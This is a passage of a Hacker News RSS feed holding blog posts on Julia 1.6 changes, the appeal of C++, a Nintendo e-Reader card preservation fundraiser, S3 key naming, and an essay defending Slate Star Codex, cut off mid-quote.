You also should notice the dimming of type parameters to make complicated types easier to read.
Also the addition of argument names, and showing functions with keyword arguments as they are written, rather than as a weird <code>#DataFrame#654</code> internal function.
The whole thing just looks more modern and polished.</p>

<h3 id="time-traveling-debugger">Time Traveling Debugger</h3>

<p><a href="https://julialang.org/blog/2020/05/rr/">Julia 1.5 added built-in support</a> for <a href="https://rr-project.org/"><code>rr</code></a> (Linux only for now).
This is not useful so much for debugging Julia code, but for debugging Julia itself.
If you get into one of the very rare situations where the language is doing something truly nonsensical, you can send a bug report recorded via <code>rr</code> and someone can debug <em>exactly</em> what is happening - even to the extent of <a href="https://julialang.org/blog/2020/09/rr-memory-magic/">diagnosing faulty RAM</a>.
<code>rr</code> is an impressively cool piece of tech.
It records execution of a program, intercepting places (namely syscalls) that could be nondeterministic and storing the result.
It can then replay the recording (even on another machine), and see exactly what happened.
Allowing on to go into great detail on the state, and step backwards and forwards through time.
The <code>rr</code> integration is really nice and easy to use.
On a project I was running, I ended up getting a member of our architecture and operations team run it to submit a support request and they had no real troubles
(And they are by no means a Julia pro, they write mostly Cloudformation).</p>

<h2 id="syntax">Syntax</h2>

<h3 id="import-as"><code>import as</code></h3>

<blockquote>
  <p>The syntax import A as B (plus import A: x as y, import A.x as y, and using A: x as y) can now be used to rename imported modules and identifiers (<a href="https://github.com/JuliaLang/julia/issues/1255">#1255</a>).</p>
</blockquote>

<p>This will be familiar to Python folks who love to write things like: <code>import numpy as np</code>.
I hope we never see it used that ubiquitously in julia.
I am quite happy with <code>using Foo</code> which imports into scope everything the author of <code>Foo</code> exported.
Python people find that super weird and scary; but it‚Äôs fine.
Note that in Julia, many (most?) things you use don‚Äôt belong to the scope of the module that defined them anyways; they are overloaded functions e.g. from <code>Base</code>.
So what you import doesn‚Äôt matter as much as you might think.
I recently learned that Haskell is like Julia with a default of importing all exports.
It has been fine for julia, and fine for Haskell for ages, though in neither is it required.</p>

<p>The real value of <code>import FooBar as fb</code> is not to have a short abbreviation so you can do <code>fb.quux</code>.
That was already possible via <code>const fb = FooBar</code>.
It is to handle cases where the package name itself conflicts with an identifier.
For example (as has often occurred) if one uses a <code>Pipe</code> in the REPL, and then later wants to load <a href="https://github.com/oxinabox/Pipe.jl/">Pipe.jl</a> via <code>import Pipe</code> then one gets a name clash before it can be ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html">https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html</a></em></p>]]>
            </description>
            <link>https://www.oxinabox.net/2021/02/13/Julia-1.6-what-has-changed-since-1.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132801</guid>
            <pubDate>Sun, 14 Feb 2021 14:46:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why do I love C++?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26132484">thread link</a>) | @mechnesium
<br/>
February 14, 2021 | https://mikeloomisgg.github.io/2019-03-14-why-do-i-love-cpp/ | <a href="https://web.archive.org/web/*/https://mikeloomisgg.github.io/2019-03-14-why-do-i-love-cpp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-why-do-i-love-cpp" class="page" role="article"><header><p> <time datetime="2019-03-14T00:00:00+00:00">14 Mar 2019</time> on <a href="https://mikeloomisgg.github.io/tag/cpp/">c++</a></p></header><p>Encountering a new programming language can be overwhelming for anybody. Just like everyone else, my first time parsing a c++ program was quite confusing. There are so many new operators and syntax that are different than any other language. What are lambdas? <code>[](){ return what?; }</code>? How many times will I need to look on stack overflow for an explanation of &amp; vs &amp;&amp; vs *? How do I make interface-like objects? Templated code is mystifying! I wish c++ had all of the algorithms and iterator tools that I used from python‚Ä¶ Seg faults are happening in this large code-base and I don‚Äôt have a working debugger for this platform? Yes, welcome to programming hell!</p><p>Yet with every new discovery, I was filled with a sense of realization. <em>That</em> is the way Java does interfaces under the hood? <em>This</em> is what Go doesn‚Äôt allow you to do? My highly abstract code is being completely optimized to literally <em>nothing</em>? Rather than venturing into a deep mental quagmire, it felt more like c++ lifted the curtain on every other language‚Äôs intricacies.</p><p>Everything in other languages -clicks-! I begin to realize why the other languages have the restrictions that they do, how they implement the features that they have. So what do all of these new symbols and syntaxes mean, and how could anyone think c++ feels fresh and new in 2019?</p><p>Decades have passed since the time Bjarne Stroustrup first created ‚ÄúC with Objects‚Äù. It is no small miracle that the c++ we have today has remained relatively untarnished by the <em>bright ideas</em> proposed by the <em>geniuses</em> that surrounded Bjarne. Alexander Stepanov, creator of the c++ Standard Template Library (STL), recollects his account of c++‚Äôs evolution:</p><blockquote><p>Bjarne was resolute in preserving his fundamental goals ‚Ä¶ People were telling Bjarne that you should turn c++ into a fully object oriented language‚Ä¶ make it automatically garbage collectable‚Ä¶ make all the member functions virtual‚Ä¶ eliminate global functions‚Ä¶ in other words they wanted him to design Java. He listened politely to them and kept maintaining the fundamental integrity of the language.<br> <a href="https://youtu.be/nesCaocNjtQ?t=18">CppCon 2014: Bjarne Stroustrup ‚ÄúMake Simple Tasks Simple!‚Äù</a></p></blockquote><p>He was a visionary, not succumbing to the bad advice of those around him that went on to create Java. None of these features could be simply integrated into the standard while remaining zero cost. His ideas have always been under constant assault from geniuses who think its okay to make sacrifices in runtime performance for some feature they like. Years of this behavior has led to bloated alternative languages, each one ultimately failing to be the sexy improved alternative to c++ that it promises to be.</p><p>Today, the c++ standards committee is filled with complementary personalities ensuring the future evolution of the language. Industry titans from every corner of computer science bringing their own perspective and needs to the table. Optimism balanced with Realism. Determination met with receptivity.</p><p>All of criticism that I have seen of c++ seems very ignorant of how the language has developed within the last decade. As Herb Sutter mentioned at the end of his CppCon 2014 endnote, <a href="https://youtu.be/xnqTKD8uD64?t=5713">‚Äúc++ is a fresh new language, simpler than ever‚Äù.</a></p><p>The wild pessimism towards c++ that I‚Äôve seen are from people that aren‚Äôt embracing the new world of modern c++ that we are now in. Many people now turn to Rust as a similar alternative to c++ without realizing how similar modern c++ is to Rust. But I want to point out a few features and lack of features that I think are actually great strengths of the language.</p><h2 id="no-universal-build-system-or-package-manager">No Universal Build System or Package Manager</h2><p>C++ lacks a package manager like Java or Rust. Idiomatic c++ projects don‚Äôt simply import modules from a canonical repository like npm (javascript), Cargo (rust), pip (python). Instead, different solutions emerged from the vacuum for c++ over time. In my experience, package managers end up not really solving the problem they are designed to solve. Anyone who‚Äôs tried to deploy they‚Äôre own complex Maven project knows that its a true nightmare.</p><p>Similarly, c++ has a variety of choices for build systems. CMake is prevalent, you can use simple makefiles just like c, or you could use countless other custom solutions. I‚Äôve found that languages which support a singular build system are really easy to build simple demo apps, but once you need to build something that the default build system doesn‚Äôt support you‚Äôre in big trouble.</p><h2 id="multiple-implementations">Multiple Implementations</h2><p>C++ is not like other languages that have monolithic compiler implementations. The commitee defines c++ standards and specifications, but vendors implement the standards in isolation and competition with eachother. I‚Äôve come to appreciate that different people coming up with multiple implementations end up feeding off of the competition and making the compilers much faster than they otherwise would be alone.</p><h2 id="zero-runtime-overhead">Zero Runtime Overhead</h2><p>One of the main things that holds back new features from entering the next c++ standard are implementation details. The committee refuses to shove in features which would add unnecessary overhead for people that aren‚Äôt using the feature, or would break backwards compatibility. This is why new languages like Rust can come out in interim periods appearing to have new features which c++ lacks. However, c++ will always catch up with a better implementation due to their caution. In the meantime, most bleeding edge language features can be supported through separate user libraries anyway.</p></article></div>]]>
            </description>
            <link>https://mikeloomisgg.github.io/2019-03-14-why-do-i-love-cpp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132484</guid>
            <pubDate>Sun, 14 Feb 2021 14:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Nintendo e-Reader ‚Äì Fundraiser for a forgotten treasure for the GBA]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26132353">thread link</a>) | @looperhacks
<br/>
February 14, 2021 | https://hitsave.org/blog/e-reader-fundraiser/ | <a href="https://web.archive.org/web/*/https://hitsave.org/blog/e-reader-fundraiser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><span></span><p><strong>Fundraiser currently at $1190!</strong></p><p><em>End date and time: March 10, 23:59:59 EST</em></p><p><em>Guest blog post by Zac B of the e-Reader Crew</em></p><p><strong>The Nintendo e-Reader.</strong><br>A forgotten treasure for the Game Boy Advance.</p><p><img src="https://cdn.bulbagarden.net/upload/4/4c/Ereader.png" alt="img"></p><p>The Nintendo e-Reader was primarily designed to act as a gateway for DLC (downloadable content) through the use of collectible cards. Each card, known as ‚Äòe-Reader Cards‚Äô, was embellished with a printed pattern referred to as a ‚Äòdot code‚Äô, in addition to an image representing the game the DLC was for.</p><p><img src="https://i.imgur.com/Yle5VRV.png" alt="img"></p><p>When swiping a card through the e-Reader, this dot code could be read and converted to digital data, which allowed the content to be imported or unlocked in the associated Game Boy Advance game. Perhaps the most well-known example of this was the <a href="https://youtu.be/z9KAaYkzuUk">Eon Ticket</a> for Pok√É¬©mon Ruby &amp; Pok√É¬©mon Sapphire versions.</p><p>There are over 3,000 cards in the Nintendo e-Reader library, many of which were only released in Japan. e-Reader cards had a variety of distribution options, from simple store-bought booster packs to exceedingly rare Japanese-only Club Nintendo cards. There were even cards which were exclusive to attendees of E3 2002 in Los Angeles. Some cards (assigned a unique ID and data) were not made commercially available at all, and were only distributed to a select number of stores in Japan for demonstration purposes.</p><p><iframe src="https://www.youtube.com/embed/F6_HEYbqxvs" allowfullscreen="" title="YouTube Video"></iframe></p><p>18 years later, what has happened to the Nintendo e-Reader library?</p><p>e-Reader cards are especially susceptible to wear-and-tear, as they are not housed inside a cartridge or a disc, both of which provide a modicum of protection from the outside world. You can find many e-Reader cards on auction sites today with no further protection beyond the cardboard they were printed on. Bends, scuffs, scratches, and tears are not uncommon. Coupled with the extreme rarity and price of some of these cards (some reaching prices of tens of thousands of dollars), it‚Äôs a wonder as to how much longer they‚Äôll be around.</p><p>There hasn√¢‚Ç¨‚Ñ¢t been much attention placed on the documentation and preservation of e-Reader cards from the wider community, with some cards still remaining unaccounted for on lists such as No-Intro‚Äôs DAT-o-MATIC. This lack of attention is surprising, considering that a great many cards contain exclusive data for various well-known franchises such as Mario, Pok√É¬©mon, Animal Crossing, and Mega Man.</p><p>Those within the e-Reader Project would like to change that.</p><p>What started out as a few like-minded individuals discussing their collection has turned into something much more in just a couple of years. As we started talking about our collections, <a href="https://wiki.no-intro.org/index.php?title=Nintendo_-_Game_Boy_Advance_e-Reader_Cards_undumped">No-Intro‚Äôs undumped list</a> became a topic of conversation, and we began to wonder when, if ever, those cards would see the light of day and to what degree people were actively attempting to tick them off.</p><p>And as time passed, that question began to evolve into another; ‚Äú<strong>Why not us?</strong>‚Äù. So we did.</p><p>The <strong>‚Äúe-Reader Crew‚Äù</strong> is a (now larger) group of preservationists with a very big goal: To catalogue and verify every e-card in the Nintendo e-Reader library.</p><p>One of the major ways we intend on accomplishing this is through the use of 3200 DPI scans.
We settled on such a high resolution because it allows both the <a href="https://www.caseyprinting.com/blog/what-is-a-rosette-pattern">rosette pattern</a> (also known as halftones) from the printing process and the dot code itself to be captured clearly.</p><p>For consistency, all scans are being performed using an Epson v600 scanner with a color calibrated profile via SilverFast; professional scanning software. Every unique side of an e-Reader card will be scanned in 3200 DPI at least once. We‚Äôve also had custom cuts of plexiglass made which are designed to reliably and consistently orient cards inside the scanner as well as gently apply pressure to ensure that they lay flat on the scan bed:</p><p><img src="https://i.imgur.com/6CDFX3X.jpg" alt="img"></p><p>This should allow for the best possible scans from our equipment.</p><p>We already have several full sets of cards from various different franchises scanned and preserved in this quality, including the aforementioned incredibly rare Store-Only Demo and Club Nintendo cards. We also have scans of booster boxes and packs in the same quality. Here is an example of one of our card scans resized to a much smaller resolution (The magnified areas show the kind of detail we are able to capture):</p><p><img src="https://i.imgur.com/GSr9ZPO.png" alt="img"></p><p>There are a couple of cards which will prove to be difficult or near impossible to obtain, such as the <a href="https://ereader.no-intro.org/resources_u/kirbycard.jpg">1st Prize Kirby Card</a> from E3 2002, of which only 10 were printed.
For any cards that are entirely out of our grasp (and for those cards only), we will explore potential recreation of the experience; something we‚Äôve almost fully achieved with the <a href="https://github.com/The-Revvy/kirby-1st-recreation">1st Prize Kirby Card already</a>.
<em>(A big thank you to <a href="https://github.com/The-Revvy">The-Revvy</a> for their work on this!)</em>.</p><p>For historical purposes, we intend to make an image recreation of this card in the same quality, given its similarities to both the 2nd Place and ‚ÄòLoser‚Äô cards within the same set. We‚Äôd like to think of this as a temporary measure while we wait and hope for these cards to eventually see the light of day. Any recreated cards will be noted accordingly. However, it‚Äôs important to stress that this will only account for a few cards at most.</p><p>We also intend to preserve e-Reader cards by submitting card hashes to the DAT-o-MATIC database for comparison.</p><p>One recurring issue that we‚Äôve had when attempting to reach out and preserve e-card hashes within the Pok√É¬©mon Trading Card Game community is that a majority of the most valuable cards are held within grading cases.</p><p>Almost every collector we‚Äôve been in contact with has been very co-operative and willing to help; however, understandably nobody is willing to remove their rare and expensive cards from grading cases and/or risk damaging them. Performing our own physical e-Reader disassembly tests, we concluded that it is possible to scan e-cards from within cases and toploader sleeves with a physical modification of the e-Reader.</p><p>We√¢‚Ç¨‚Ñ¢ve been in contact with a very talented 3D modeler called RevZ, explained our dilemma to him, and presented the idea of creating a modified e-Reader shell capable of scanning cards from within these cases. Within two weeks, we shipped him an e-Reader and cards for testing purposes, and he produced his first 3D mockup.</p><p><img src="https://i.imgur.com/StjHfBg.png" alt="img"></p><p>In just a month, we had our first fully functional prototype which he has kindly demonstrated in the following video. We‚Äôve dubbed this modification the <strong>‚Äúe+ PRO‚Äù</strong>:</p><p><iframe src="https://www.youtube.com/embed/snFQV4L9wIM" allowfullscreen="" title="YouTube Video"></iframe></p><p>Additional shims or trays for toploader‚Äôd and loose cards are also in the process of being created.</p><p>Despite still being in the prototyping stage, this modification has several exciting advantages relating to preservation as well as allowing collectors to actually <em>use</em> their e-Reader cards while maintaining the benefit of protecting their cards with toploaders or cases.</p><p>The ideal continuation of the project would be to take these concepts a step further and explore the possibility of utilizing computer vision software to generate uniform dot code images from users own high quality scans which would allow for quick hash verification for any card that can be scanned.</p><p>At the moment, this is merely a prospect and is not something we can promise to commit to at this stage.</p><p>While all of this is very promising, the team needs <strong>your help</strong>!</p><p><strong><em>We‚Äôre looking to raise a total of $3,000 (USD) in donations to work toward this preservation goal.</em></strong></p><p>The funds will be used for:</p><ul><li>Purchase of <a href="https://wiki.no-intro.org/index.php?title=Nintendo_-_Game_Boy_Advance_e-Reader_Cards_undumped">undumped, unavailable, and unscanned cards</a>.</li><li>Providing matching scanners and tools to collectors with large collections or rare cards who are willing to contribute their time and effort to the project.</li><li>Production of custom acrylic templates for holding the cards in place while scanning.</li><li>Materials and cost of e-Reader modification production.</li><li>Shipping costs related to all of the above.</li></ul><p>In addition to preserving e-Reader cards as an important part of gaming history, the project will provide further benefits:</p><ul><li>The data and information stored on the e-Reader cards will be preserved for future generations, without the need of trying to hunt these down decades from now.</li><li>Guides on how to preserve and restore e-Reader cards.</li><li>The resulting 3D models of the final physical e-Reader modification will be made publicly available to 3D print.</li></ul><span></span><p><em>Hit Save! is a 501(c)(3) nonprofit organization and your donations are tax-deductible to the extent allowed by law.</em>
<em>All donations up to the amount above will go to this project. Any donations above said amount will be used for similar preservation and history projects in the future.</em></p></article></div>]]>
            </description>
            <link>https://hitsave.org/blog/e-reader-fundraiser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132353</guid>
            <pubDate>Sun, 14 Feb 2021 13:48:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[S3 is not a filesystem, and that's OK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26132243">thread link</a>) | @michalc
<br/>
February 14, 2021 | https://charemza.name/blog/posts/s3/s3-is-not-a-filesystem/ | <a href="https://web.archive.org/web/*/https://charemza.name/blog/posts/s3/s3-is-not-a-filesystem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
      

<article itemscope="" itemtype="http://schema.org/BlogPosting" itemref="michal-charemza-author michal-charemza-limited-publisher michal-charemza-image">
  <header>
    
    <p itemprop="description">and that's OK</p>
    <p><time itemprop="datePublished" datetime="2021-02-14T13:00:00.000Z">Sunday February 14th, 2021</time></p>
    
  </header>
  <div itemprop="articleBody">
    
<p>Something that occasionally catches developers out is the fact that S3 is not a filesystem, but a key-value store. Specifically</p>

<ul>
  <li><i></i> the keys can be any UTF-8 encoded string, between 1 and 1024 bytes long;</li>
  <li><i></i> the values can be any binary string, beteen 0 bytes and 5 terabytes long.</li>
</ul>

<p>Yes, you can emulate certain features of a filesystem using slashes in the keys. In fact, the AWS console does this: it creates a folder by creating a 0-byte object with a trailing slash in its key.</p>

<p>But, you don't have to be limited by the key-structure that a filesystem imposes. For example, if you want to:</p>

<ul>
  <li><i></i> you can have objects, with data, at both of the keys <code>a</code> and <code>a/b</code>;</li>
  <li><i></i> and you can have objects, with data, that have keys ending in <code>/</code>.</li>
</ul>

<p>Both of these are impossible in a traditional filesystem.</p>

<p>An example of using this is to store an uploaded file, <code>some-unique-name.txt</code> say, and then store derived data inside its "folder", for example <code>some-unique-name.txt/analysis1</code> and <code>some-unique-name/analysis2</code>.</p>

<h3>Now a warning</h3>

<p>If you're about to leverage the fact S3 is a key-value store by having non filesystem-compatible keys, be warned: there are consequences.</p>

<ul>
  <li><i></i> You won't be able to easily sync from your S3 bucket to a filesystem.</li>
  <li><i></i> Everything that claims to be S3 compatible may not be, and so migrating to those systems, or using them in a test environment, may be trickier. Specifically, <a href="https://github.com/minio/minio/issues/10160">minio [that I have used many times and generally really like] is not S3-compatible in this way</a>.</li>
</ul>

<p>So, there are some valid pragmatic reasons to make sure your keys are filesystem-compatible. But, I can't help the niggling feeling that it's a shame to be limited by systems you're not using.</p>

  </div>
</article>

  </div></div></div>]]>
            </description>
            <link>https://charemza.name/blog/posts/s3/s3-is-not-a-filesystem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132243</guid>
            <pubDate>Sun, 14 Feb 2021 13:32:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In defense of interesting writing on controversial topics]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 132 (<a href="https://news.ycombinator.com/item?id=26132104">thread link</a>) | @petulla
<br/>
February 14, 2021 | https://www.slowboring.com/p/slate-star-codex | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/slate-star-codex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a free preview of Slow Boring. If you like what you read, consider supporting this site by <a href="http://www.slowboring.com/subscribe">subscribing</a>. </em></p><p>Some time ago, Scott Alexander, the pseudonymous author of the Slate Star Codex blog, announced that he was abandoning his site. The reason was that a New York Times reporter had been in touch with him explaining that he was doing a profile of the blog, and in the course of writing it he was compelled by some NYT policy to disclose Alexander‚Äôs real name. </p><p>Alexander is a practicing psychiatrist and felt that for reasons of professional ethics, this would jeopardize his job ‚Äî so he shut the blog down in a rather dramatic fashion. This, in turn, led to a lot of condemnatory rhetoric from his fans and admirers, many of whom work in the technology industry and had a set of preexisting grievances with what they call ‚Äúthe media‚Äù and what I would call ‚Äúthe technology coverage of a half dozen outlets, notably including The New York Times.‚Äù Much of the ensuing rhetoric from the pro-SSC camp (though not from Alexander, who if anything is even-tempered to a fault in his public persona) struck me as overheated, but I was sad it had driven Alexander from the internet.</p><p>The good news is that he has since resurfaced on Substack at <a href="https://astralcodexten.substack.com/">Astral Codex Ten</a>. He also has a new job as the founder of <a href="https://lorienpsych.com/">Lorien Psychiatry</a>, an innovative effort to use telemedicine to make psychiatric treatment much more affordable. </p><p>Then, on Saturday, <a href="https://www.nytimes.com/2021/02/13/technology/slate-star-codex-rationalists.html">Cade Metz‚Äôs NYT article about SSC finally dropped</a>. And it‚Äôs terrible. (Read <a href="https://astralcodexten.substack.com/p/statement-on-new-york-times-article">Alexander‚Äôs post</a> about it, though I think he has too much of a conspiratorial view of this.<a id="footnote-anchor-1" href="#footnote-1">1</a>)</p><p>I tend to think that too much time and mental energy is expended, including by me, on critiquing bad articles, and not enough time and energy is spent on praising good ones. So I feel kind of bad about writing a detailed criticism of a single bad article. But, given the larger context in which this story appeared, my sense is it‚Äôs going to become a flashpoint for a whole bunch of interesting struggles, so I think it‚Äôs useful and informative to say what I think. </p><h4>A tortured premise</h4><p>On its face, the idea of profiling an obscure blog written by a pseudonymous psychiatrist that has a surprisingly high-clout readership is perfectly good. Alexander‚Äôs readers include many Silicon Valley people, including ‚Äî as Metz details ‚Äî some very high-ranking executives. It‚Äôs an interesting story. </p><p>But I think Metz kind of misses what‚Äôs interesting about it from the get-go. </p><ul><li><p><a href="https://twitter.com/douthatnyt/status/859771088125005824?lang=en">Ross Douthat</a> reads SSC, and so does <a href="https://www.vox.com/2014/12/1/7311417/race-law-controls">Ezra Klein</a>. </p></li><li><p><a href="https://www.nytimes.com/2018/03/08/opinion/student-mobs.html">David Brooks</a> has quoted him in The New York Times. </p></li><li><p><a href="https://marginalrevolution.com/marginalrevolution/2017/04/excerpt-chat-ezra.html">Tyler Cowen</a> praises SSC and the larger ‚Äúrationalist community‚Äù that it was a flagship publication of, but also critiques them, saying ‚ÄúI would approve of them much more if they called themselves the irrationality community.‚Äù</p></li></ul><p>As you‚Äôll see in Metz‚Äôs story, the Vox writer Kelsey Piper is an SSC reader and a rationalist. But she works primarily for Vox‚Äôs <a href="https://www.vox.com/future-perfect">Future Perfect</a> vertical, which is a whole rationalist-inspired cornucopia of content. </p><p>In other words, this is an intellectual movement that‚Äôs somewhat influential in highbrow circles broadly, and that deserves to be situated as such. Well-known books like Toby Ord‚Äôs <a href="https://www.amazon.com/Precipice-Existential-Risk-Future-Humanity/dp/0316484911">‚ÄúThe Precipice‚Äù</a> and Philip Tetlock‚Äôs <a href="https://www.amazon.com/Superforecasting-Science-Prediction-Philip-Tetlock/dp/0804136718">‚ÄúSuperforecasting: The Art and Science of Prediction‚Äù</a> are important parts of the rationalist firmament. There‚Äôs also Julia Galef‚Äôs excellent podcast ‚ÄúRationally Speaking‚Äù on which <a href="https://podcasts.google.com/feed/aHR0cDovL3d3dy5ueWNza2VwdGljcy5vcmcvc3RvcmFnZS9mZWVkcy9ycy54bWw/episode/YzZlZTFhZmUtMTkwMS00ZDZiLTg1Y2QtMjhlNDI3ODE5YTJk?hl=en&amp;ved=2ahUKEwiNhNeMzefuAhXNFVkFHUIfB5EQieUEegQIDhAF&amp;ep=6">you can hear me yacking</a>. </p><p>There‚Äôs a lot more going on than ‚Äúsome tech executives read this blog,‚Äù in other words. </p><p>But Metz does not seem interested in actually exploring rationalist ideas or understanding their content or the scope of their influence. Instead, the article is structured as a kind of syllogism:</p><ul><li><p>Scott Alexander‚Äôs blog is popular with some influential Silicon Valley people.</p></li><li><p>Scott Alexander has done posts that espouse views on race or gender that progressives disapprove of. </p></li><li><p>Therefore, Silicon Valley is a hotbed of racism and sexism. </p></li></ul><p>One time years ago, I went to Silicon Valley for a few days. As a white guy, I would not be well-situated to assess the extent to which it‚Äôs a hotbed of racism and sexism anyway, so I won‚Äôt comment on the conclusion. But the logic is specious, and the whole thing is an incredible missed opportunity to help people understand some valuable and interesting ideas. </p><h4>Rationalism as I understand it  </h4><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png&quot;,&quot;height&quot;:408,&quot;width&quot;:1022,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:702783,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Early Modern rationalists ‚Äî Descartes, Spinoza, Leibniz</figcaption></figure></div><p>When I first heard about rationalists I was intensely confused, because in college I took a few different classes that involved reading ‚Äúrationalist‚Äù philosophers from the Early Modern period, and contemporary rationalists‚Äô ideas are totally unlike early modern philosophical rationalists‚Äô ideas.<a id="footnote-anchor-2" href="#footnote-2">2</a> I should also note that contemporary rationalism is both a set of ideas and also a specific community in the Bay Area that, as I understand it, involves polyamory and communal living of some kind. I don‚Äôt have any real knowledge or understanding of the latter and am just talking about ideas. </p><p>Rationalists‚Äô big thing is that the natural human process of cognition is <em>capable</em> of reaching accurate results, but that‚Äôs not really the default mode. And rationalists are not just aware of this ‚Äî they think it‚Äôs a big problem, and they try really hard to push back on it and develop better reasoning skills. </p><p>I think that‚Äôs probably why a rationalist blog is very popular in Silicon Valley. The nature of VC investing or the management of an early-stage startup is that there is incredible monetary value in making correct predictions in the face of imperfect information. Then on top of that, the kinds of recommendations that rationalists give for how to reason better tend to align with engineers‚Äô natural instincts and inclinations:&nbsp;be more bloodless and objective, evaluate claims on the merits in isolation, gather and surface all available facts. </p><p>This thing I did where I tried to <a href="https://www.slowboring.com/p/predictions">list specific predictions with specific probabilities</a> so I can go back and check to see how wrong I was is a rationalist idea. </p><p>But of course, there‚Äôs more to it than predicting. The key to Metz‚Äôs point is that part of the practice of rationalism is that in order to do it effectively, you have to be willing to be impolite. Not necessarily 24 hours a day or anything, but when you‚Äôre in Rationalism Mode you can‚Äôt also ‚Äúread the room.‚Äù A rationalist would say that human psychology is <em>over-optimized</em> for reading the room, and that to get at the truth you need to be willing to deliberately turn off the room-reading portion of your brain and just throw your idea out. </p><p>Compared to the public masses, the biggest difference between rationalists and everyday Americans is almost certainly that <a href="https://www.pewresearch.org/fact-tank/2018/04/25/key-findings-about-americans-belief-in-god/">Americans are very religious</a>. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png&quot;,&quot;height&quot;:380,&quot;width&quot;:640,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:27299,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>But a quirk of American life is that even though most Americans say they believe in God as described in the Bible, nobody thinks it‚Äôs interesting to argue about this. By contrast, lots of people like to argue about race and gender issues. But in progressive circles, it is common to observe the norm that because the struggle against racism and misogyny is important, it is impolite to dissent from an anti-racist claim or argument unless you have some overwhelmingly important reason for doing so. </p><h4>Rationality vs. manners</h4><p>This exchange between Conor Friedersdorf and Chris Hayes on the merits of arguing about the San Francisco School Board illustrates the progressive norm, upheld here by Hayes.</p><p>To an extent, I disagree with Hayes about this specific case<a id="footnote-anchor-3" href="#footnote-3">3</a>, but I accept the basic force of his logic. Hayes, as a prime time cable television host, has a kind of power in our society that it‚Äôs incumbent on him to wield wisely. And while I think wielding that power wisely entails not lying to people, it is compatible with discretion about what truths one chooses to speak. But even though rationalists will understand the strategic logic of this kind of argument as well (if not better) than most, the <em>practice</em> of rationalism requires setting it aside. </p><p>You see this on display in a post Metz criticizes titled <a href="https://slatestarcodex.com/2017/08/01/gender-imbalances-are-mostly-not-due-to-offensive-attitudes/">‚ÄúGender Imbalances Are Mostly Not Due To Offensive Attitudes.‚Äù</a></p><p>In the (liberal, coastal, urban, very political) circles that I travel, everyone (especially parents) knows and acknowledges that men and women are, on average, different in ways that end up mattering for the distribution of outcomes. But everyone also believes that sexism and misogyny are significant problems in the world, and that the people struggling against those problems are worthy of admiration and praise. So to leap into a conversation about sexism and misogyny yelling <a href="https://pubmed.ncbi.nlm.nih.gov/30206941/">‚ÄúWELL ACTUALLY GIOLLA AND KAJONIUS FIND THAT  SEX DIFFERENCES IN PERSONALITY ARE LARGER IN COUNTRIES WITH MORE GENDER EQUALITY‚Äù</a> would be considered a rude and undermining thing to do. This is just to say that most people are not rationalists ‚Äî they believe that statements can be evaluated on grounds beyond truth and falsity. There is suspicion of the guy who is ‚Äújust asking questions.‚Äù </p><p>Annie Lowrey even published a piece in the Atlantic denouncing the <a href="https://www.theatlantic.com/ideas/archive/2020/07/may-i-introduce-you-facts-man/614827/">‚ÄúFacts Man‚Äù</a> on precisely these terms:  </p><blockquote><p>Sometimes, Facts Man is less about truth than raising questions. Why can‚Äôt Facts Man talk about certain 